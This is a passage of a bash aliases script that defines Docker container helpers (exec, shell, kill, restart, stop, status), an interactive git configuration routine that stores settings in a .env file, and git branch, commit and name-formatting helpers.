        docker system prune --force
    fi

    if [ "${volume}" = true ]; then
        _echo_info 'docker volume prune --force\n'
        docker volume prune --force
    fi
}

alias dex='docker-exec' ## docker-exec alias

## Execute command inside given container (interactive)
function docker-exec() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'docker-exec (container) [-c command] [-u user] -b [bash command] -s [sh command] -S [shell] -d (use docker-compose) -t (tty) -h (help)\n'
        _echo_success 'example:' 2 "$1"; _echo_primary "docker-exec container_name -c \"bash -c 'echo FooBar'\"\n"
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local command
    local compose=false
    local container
    local container_command
    local container_shell
    local containerS=()
    local tty=false
    local user

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :b:c:dS:s:tu:h option; do
            case "${option}" in
                b) container_shell='bash'; container_command="${OPTARG}";;
                c) container_command="${OPTARG}";;
                d) compose=true;;
                S) container_shell="${OPTARG}";;
                s) container_shell='sh'; container_command="${OPTARG}";;
                t) tty=true;;
                u) user="${OPTARG}";;
                h) _echo_warning 'docker-exec\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Execute command inside given container with docker or docker compose\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check docker installation
    #--------------------------------------------------

    if [ ! -x "$(command -v docker)" ]; then
        _echo_danger 'error: docker required, enter: "sudo apt-get install -y docker" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate option value
    #--------------------------------------------------

    if [ -z "${container_command}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    container=${arguments[${LBOUND}]}

    #--------------------------------------------------
    # Pick container
    #--------------------------------------------------

    if [ -z "${container}" ]; then
        # copy command result to "containerS" array
        while IFS='' read -r LINE; do
            containerS+=("${LINE}");
        done < <(docker ps --format '{{.Names}}')

        if [ -z "${containerS[${LBOUND}]}" ]; then
            _echo_danger 'error: No running container found\n'
            return 1;
        fi

        PS3=$(_echo_success 'Please select container : ')
        select container in "${containerS[@]}"; do
            # validate selection
            for ITEM in "${containerS[@]}"; do
                # find selected container
                if [[ "${ITEM}" == "${container}" ]]; then
                    # break two encapsulation levels
                    break 2;
                fi
            done
        done
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------

    # Check docker installation
    if [ "${compose}" = true ]; then
        if [ ! -x "$(command -v docker-compose)" ]; then
            _echo_danger 'error: docker-compose required\n'
            return 1
        fi
    fi

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    if [ "${compose}" = true ]; then
        command="docker-compose exec"
    else
        command="docker exec --interactive"

        if [ "${tty}" = true ]; then
            command="${command} --tty"
        fi
    fi

    if [ -n "${user}" ]; then
        command="${command} --user ${user}"
    fi

    command="${command} ${container}"

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ -n "${container_shell}" ]; then
        command="${command} ${container_shell} -c '${container_command}'"
    else
        command="${command} ${container_command}"
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    _echo_info "${command}\n"
    eval "${command}"
}

alias dkl='docker-kill' ## docker-kill alias

## Kill running containers
function docker-kill() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'docker-kill (container) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local container

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'docker-kill\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Kill running containers\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check docker installation
    #--------------------------------------------------

    if [ ! -x "$(command -v docker)" ]; then
        _echo_danger 'error: docker required, enter: "sudo apt-get install -y docker" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    container=${arguments[${LBOUND}]}

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ -z "${container}" ]; then
        _echo_info "docker kill $(docker ps --format '{{.Names}}' | tr -s "\n" ' ')\n"
        # shellcheck disable=SC2046
        docker kill $(docker ps --format '{{.Names}}')

        return 0
    fi

    _echo_info "docker kill \"${container}\"\n"
    docker kill "${container}"
}

alias dls='docker-list' ## docker-list alias

## List running containers
function docker-list() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'docker-list -a (all) -d (use docker-compose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local all=false
    local compose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :adh option; do
            case "${option}" in
                a) all=true;;
                d) compose=true;;
                h) _echo_warning 'docker-list\n';
                    _echo_success 'description:' 2 14; _echo_primary 'List running containers\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check docker installation
    #--------------------------------------------------

    if [ ! -x "$(command -v docker)" ]; then
        _echo_danger 'error: docker required, enter: "sudo apt-get install -y docker" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Check docker installation
    #--------------------------------------------------

    if [ "${compose}" = true ]; then
        if [ ! -x "$(command -v docker-compose)" ]; then
            _echo_danger 'error: docker-compose required\n'
            return 1
        fi
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${compose}" = true ] &&  [ "${all}" = true ]; then
        _echo_info "docker-compose ps --all --quiet 2>/dev/null\n"
        docker-compose ps --all --quiet 2>/dev/null

        return 0
    fi

    if [ "${compose}" = true ]; then
        _echo_info "docker-compose ps --quiet 2>/dev/null\n"
        docker-compose ps --quiet 2>/dev/null

        return 0
    fi

    if [ "${all}" = true ]; then
        _echo_info "docker ps --all --quiet --format '{{.Names}}'\n"
        docker ps --all --quiet --format '{{.Names}}'

        return 0
    fi

    _echo_info "docker ps --format '{{.Names}}'\n"
    docker ps --format '{{.Names}}'
}

alias drt='docker-restart' ## docker-restart alias

## Restart container (interactive)
function docker-restart() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'docker-restart -a (all) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local all=false
    local container

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :ah option; do
            case "${option}" in
                a) all=true;;
                h) _echo_warning 'docker-restart\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Restart container (interactive)\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check docker installation
    #--------------------------------------------------

    if [ ! -x "$(command -v docker)" ]; then
        _echo_danger 'error: docker required, enter: "sudo apt-get install -y docker" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Execute short command
    #--------------------------------------------------

    if [ "${all}" = true ]; then
        _echo_info "docker restart $(docker ps --format '{{.Names}}' | tr -s "\n" ' ')\n"
        # shellcheck disable=SC2046
        docker restart $(docker ps --format '{{.Names}}')

        return 0
    fi

    #--------------------------------------------------
    # Pick container
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        # copy command result to "containers" array
        while IFS='' read -r LINE; do
            containers+=("${LINE}");
        done < <(docker ps --format '{{.Names}}')

        if [ -z "${containers[${LBOUND}]}" ]; then
            _echo_danger 'error: No running container found\n'
            return 1;
        fi

        PS3=$(_echo_success 'Please select container : ')
        select container in "${containers[@]}"; do
            # validate selection
            for item in "${containers[@]}"; do
                # find selected container
                if [[ "${item}" == "${container}" ]]; then
                    # break two encapsulation levels
                    break 2;
                fi
            done
        done
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    _echo_info "docker restart \"${container}\"\n"
    docker restart "${container}"
}

alias dsh='docker-shell' ## docker-shell alias

## Enter interactive shell inside container (interactive)
function docker-shell() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'docker-shell (container) [-u user] -S [shell] -a (ash) -b (bash) -c (csh) -d (dash) -k (ksh) -s (sh) -t (tcsh) -z (zsh) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local container
    local container_shell='sh'
    local containers=()
    local user

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :abcdkS:stzu:h option; do
            case "${option}" in
                a) container_shell='ash';;
                b) container_shell='bash';;
                c) container_shell='csh';;
                d) container_shell='dash';;
                k) container_shell='ksh';;
                S) container_shell="${OPTARG}";;
                s) container_shell='sh';;
                t) container_shell='tcsh';;
                z) container_shell='zsh';;
                u) user="${OPTARG}";;
                h) _echo_warning 'docker-shell\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Enter interactive shell inside given container\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check docker installation
    #--------------------------------------------------

    if [ ! -x "$(command -v docker)" ]; then
        _echo_danger 'error: docker required, enter: "sudo apt-get install -y docker" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    container=${arguments[${LBOUND}]}

    #--------------------------------------------------
    # Pick container
    #--------------------------------------------------

    if [ -z "${container}" ]; then
        # copy command result to "containers" array
        while IFS='' read -r LINE; do
            containers+=("${LINE}");
        done < <(docker ps --format '{{.Names}}')

        if [ -z "${containers[${LBOUND}]}" ]; then
            _echo_danger 'error: No running container found\n'
            return 1;
        fi

        PS3=$(_echo_success 'Please select container : ')
        select container in "${containers[@]}"; do
            # validate selection
            for item in "${containers[@]}"; do
                # find selected container
                if [[ "${item}" == "${container}" ]]; then
                    # break two encapsulation levels
                    break 2;
                fi
            done
        done
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ -z "${user}" ]; then
        _echo_info "docker exec -it \"${container}\" \"${container_shell}\"\n"
        docker exec -it "${container}" "${container_shell}"

        return 0
    fi

    _echo_info "docker exec -it -u \"${user}\" \"${container}\" \"${container_shell}\"\n"
    docker exec -it -u "${user}" "${container}" "${container_shell}"
}

alias dst='docker-status' ## docker-status alias

## List images, volumes and network information
function docker-status() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'docker-status -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) echo_title 'docker-status';
                _echo_success 'description:' 2 14; _echo_primary 'Print containers status\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check docker installation
    #--------------------------------------------------

    if [ ! -x "$(command -v docker)" ]; then
        _echo_danger 'error: docker required, enter: "sudo apt-get install -y docker" to install\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info 'docker ps --all\n'
    docker ps --all

    _echo_info 'docker images --all\n'
    docker images --all

    _echo_info 'docker volume ls\n'
    docker volume ls

    _echo_info 'docker network ls\n'
    docker network ls

    _echo_info "docker inspect --format '{{slice .ID 0 13}} {{slice .Name 1}} {{range .NetworkSettings.Networks}}{{if .IPAddress}}http://{{.IPAddress}} {{end}}{{end}}{{range \$p, \$c := .NetworkSettings.Ports}}{{\$p}} {{end}}' \$(docker ps --all --quiet) | column -t\n"
    # shellcheck disable=SC2046
    docker inspect --format '{{slice .ID 0 13}} {{slice .Name 1}} {{range .NetworkSettings.Networks}}{{if .IPAddress}}http://{{.IPAddress}} {{end}}{{end}}{{range $p, $c := .NetworkSettings.Ports}}{{$p}} {{end}}' $(docker ps --all --quiet) | column -t
}

alias dsp='docker-stop' ## docker-stop alias

## Stop running containers
function docker-stop() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'docker-stop (container) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local container

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'docker-stop\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Stop running containers\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check docker installation
    #--------------------------------------------------

    if [ ! -x "$(command -v docker)" ]; then
        _echo_danger 'error: docker required, enter: "sudo apt-get install -y docker" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    container=${arguments[${LBOUND}]}

    #--------------------------------------------------

    if [ -z "${container}" ]; then
        _echo_info "docker stop $(docker ps --format '{{.Names}}' | tr -s "\n" ' ')\n"
        # shellcheck disable=SC2046
        docker stop $(docker ps --format '{{.Names}}')

        return 0
    fi

    _echo_info "docker stop \"${container}\"\n"
    docker stop "${container}"
}

# set vim as default editor
if [ -x "$(command -v vim)" ]; then
    export VISUAL
    VISUAL="$(command -v vim)"
fi

## Config bash_aliases git default settings
function git-config() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    _alert_primary 'Config bash_aliases git default settings'

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local git_commit_email
    local git_commit_name
    local GIT_SERVER
    local GIT_USERNAME
    local JIRA_SERVER

    #--------------------------------------------------
    # Prompt JIRA_SERVER
    #--------------------------------------------------

    _echo_success "Please enter your Jira server domain name : [atlassian.com] "
    read -r JIRA_SERVER
    if [ -z "${JIRA_SERVER}" ]; then
        JIRA_SERVER=atlassian.com
    fi
    # sanitize user entry (trim)
    JIRA_SERVER=$(echo "${JIRA_SERVER}" | tr -d '[:space:]')
    _echo_primary "  ${JIRA_SERVER}\n"
    echo

    #--------------------------------------------------
    # Prompt GIT_SERVER
    #--------------------------------------------------

    local GIT_SERVERS=(github.com gitlab.com bitbucket.org other)
    # prompt user values
    PS3=$(_echo_success 'Please select default git server : ')
    select GIT_SERVER in "${GIT_SERVERS[@]}"; do
        # validate selection
        for ITEM in "${GIT_SERVERS[@]}"; do
            # find selected item
            if [[ "${ITEM}" == "${GIT_SERVER}" ]]; then
                # break two encapsulation levels
                break 2;
            fi
        done
    done

    #--------------------------------------------------
    # Prompt "other" GIT_SERVER
    #--------------------------------------------------

    while [ "${GIT_SERVER}" = other ] || [ -z "${GIT_SERVER}" ]; do
        _echo_success 'Please enter default git server name : '
        read -r GIT_SERVER
        # sanitize user entry (escape forward slashes)
        GIT_SERVER=$(echo "${GIT_SERVER}" | sed "s/\//\\\\\//g")
    done
    _echo_primary "  ${GIT_SERVER}\n"
    echo

    #--------------------------------------------------
    # Prompt GIT_USERNAME
    #--------------------------------------------------

    _echo_success "Please enter your ${GIT_SERVER} user name : [${USER}] "
    read -r GIT_USERNAME
    if [ -z "${GIT_USERNAME}" ]; then
        GIT_USERNAME="${USER}"
    fi
    # sanitize user entry (trim)
    GIT_USERNAME=$(echo "${GIT_USERNAME}" | tr -d '[:space:]')
    _echo_primary "  ${GIT_USERNAME}\n"
    echo

    #--------------------------------------------------
    # Prompt git_commit_email
    #--------------------------------------------------

    DEFAULT_COMMIT_EMAIL="$(git config --global --get user.email 2>/dev/null)"
    _echo_success "Please enter git config global user.email : [${DEFAULT_COMMIT_EMAIL}] "
    read -r git_commit_email
    if [ -z "${git_commit_email}" ]; then
        git_commit_email="${DEFAULT_COMMIT_EMAIL}"
    fi
    # sanitize user entry (trim)
    git_commit_email=$(echo "${git_commit_email}" | tr -d '[:space:]')
    _echo_primary "  ${git_commit_email}\n"
    echo

    #--------------------------------------------------
    # Prompt git_commit_name
    #--------------------------------------------------

    DEFAULT_COMMIT_NAME="$(git config --global --get user.name 2>/dev/null)"
    _echo_success "Please enter git config global user.name : [${DEFAULT_COMMIT_NAME}] "
    read -r git_commit_name
    if [ -z "${git_commit_name}" ]; then
        git_commit_name="${DEFAULT_COMMIT_NAME}"
    fi
    _echo_primary "  ${git_commit_name}\n"
    echo

    #--------------------------------------------------
    # Prompt GIT_SSH
    #--------------------------------------------------

    _echo_success 'Use SSH ? (yes/no) [yes] : '
    read -r RESPONSE
    if [[ "${RESPONSE}" =~ ^[Nn](Oo)?$  ]]; then
        GIT_SSH=false
    else
        GIT_SSH=true
    fi
    _echo_primary "  ${GIT_SSH}\n"
    echo

    #--------------------------------------------------
    # Config git
    #--------------------------------------------------

    _echo_info "git config --global user.email \"${git_commit_email}\"\n"
    git config --global user.email "${git_commit_email}"

    _echo_info "git config --global user.name \"${git_commit_name}\"\n"
    git config --global user.name "${git_commit_name}"

    #--------------------------------------------------
    # Set values to .env
    #--------------------------------------------------

    _create_env "${APP_USER_CONFIG_DIR}/.env"

    _set_var "JIRA_SERVER"  "${JIRA_SERVER}"  -f "${APP_USER_CONFIG_DIR}/.env"
    _set_var "GIT_SERVER"   "${GIT_SERVER}"   -f "${APP_USER_CONFIG_DIR}/.env"
    _set_var "GIT_USERNAME" "${GIT_USERNAME}" -f "${APP_USER_CONFIG_DIR}/.env"
    _set_var "GIT_SSH"      "${GIT_SSH}"      -f "${APP_USER_CONFIG_DIR}/.env"

    #--------------------------------------------------
    # Print config summary
    #--------------------------------------------------

    _echo_warning 'Current git configuration:\n'
    _echo_success 'default jira server:' 2 24;   _echo_primary "${JIRA_SERVER}\n"
    _echo_success 'default git server:' 2 24;    _echo_primary "${GIT_SERVER}\n"
    _echo_success 'default git username:' 2 24;  _echo_primary "${GIT_USERNAME}\n"
    _echo_success 'git config user.email:' 2 24; _echo_primary "$(git config user.email)\n"
    _echo_success 'git config user.name:' 2 24;  _echo_primary "$(git config user.name)\n"
    _echo_success 'use ssh:' 2 24;               _echo_primary "${GIT_SSH}\n"
    echo
    _echo_warning 'You will need to reload your terminal for these changes to take effect.\n'
    echo

    #--------------------------------------------------

    # collapse blank lines
    sed -i '/^$/d' "${APP_USER_CONFIG_DIR}/.env"
}

if [ -z "${JIRA_SERVER}" ] || \
    [ -z "${GIT_SERVER}" ] || \
    [ -z "${GIT_USERNAME}" ] || \
    [ -z "$(git config --global --get user.email 2>/dev/null)" ] || \
    [ -z "$(git config --global --get user.name 2>/dev/null)" ] || \
    [ -z "${GIT_SSH}" ] \
; then
    git-config
fi

## Check branch exists
function _branch_exists() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_branch_exists [branch name] -a (list all) -r (remotes only) -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local branch
    local command
    local list_all=false
    local remotes=false
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :avrh option; do
            case "${option}" in
                a) list_all=true;;
                r) remotes=true;;
                v) verbose=true;;
                h) _echo_warning '_branch_exists\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Check branch exists\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    branch="${arguments[${LBOUND}]}"

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    command="git show-ref --quiet --heads ${branch}"

    if [ "${remotes}" = true ]; then
        command="git show-ref --verify --quiet refs/remotes/origin/${branch}"
    fi

    if [ "${list_all}" = true ]; then
        command="git show-ref --quiet ${branch}"
    fi

    command="${command} && echo true || echo false"

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "${command}\n"
    fi

    eval "${command}"
}

## Check commit exists
function _commit_exists() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_commit_exists [commit_hash] -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local command
    local commit_hash
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :vh option; do
            case "${option}" in
                v) verbose=true;;
                h) _echo_warning '_commit_exists\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Check commit exists\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    commit_hash="${arguments[${LBOUND}]}"

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    command="git cat-file commit ${commit_hash} &>/dev/null && echo true || echo false"

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "${command}\n"
    fi

    eval "${command}"
}

# Trim
function _trim() {
    # trim
    echo -n "$1" | tr -s ' ' | sed -E 's/^ +//' | sed -E 's/ +$//'
}

# Format type
function _format_type() {
    # lowercase, trim and replace special characters and spaces (except dashes and underscores), remove trailing underscores
    echo -n "$1" | tr '[:upper:]' '[:lower:]' | tr -s ' ' | sed -E 's/[^a-z0-9_-]/_/g' | sed -E 's/_+$//'
}

# Format ticket
function _format_ticket() {
    # uppercase, trim, remove special characters and spaces (except dashes and underscores)
    echo -n "$1" | tr '[:lower:]' '[:upper:]' | tr -s ' ' | sed -E 's/[^A-Z0-9_-]//g'
}

#--------------------------------------------------

# Format branch subject
function _format_branch_subject() {
    # trim, remove type, remove ticket, lowercase,
    # replace special characters and spaces (except slashes and dashes), remove trailing underscores
    echo -n "$1" | tr -s ' ' | sed -E 's/^(build|chore|ci|docs|feat|fix|perf|refactor|style|test)\///' | sed -E 's/[A-Z]+-[0-9]+\///' | tr '[:upper:]' '[:lower:]' | sed -E 's/[^a-z0-9_\/-]/_/g' | sed -E 's/_+$//'
}

#--------------------------------------------------

# Format commit subject
function _format_commit_subject() {
    # remove type, scope, ticket and PR number from subject, trim
    echo -n "$1" | sed -E 's/^[a-z()_]+!?: //' | sed -E 's/\([A-Z]+-[0-9]+\)//g' | sed -E 's/\(#[0-9]+\)//g' | tr -s ' ' | sed -E 's/ +$//'
}

## Get current branch name
function _get_current_branch() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_get_current_branch -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local command
    local verbose=false

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :vh option; do
        case "${option}" in
            v) verbose=true;;
            h) _echo_warning '_get_current_branch\n';
                _echo_success 'description:' 2 14; _echo_primary 'Get current branch name\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    command='git rev-parse --abbrev-ref HEAD 2>/dev/null'

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "${command}\n"
    fi

    eval "${command}"
}

## Get main branch name
function _get_main_branch() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_get_main_branch -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local verbose=false
    local command

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :vh option; do
        case "${option}" in
            v) verbose=true;;
            h) _echo_warning '_get_main_branch\n';
                _echo_success 'description:' 2 14; _echo_primary 'Get main branch name\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
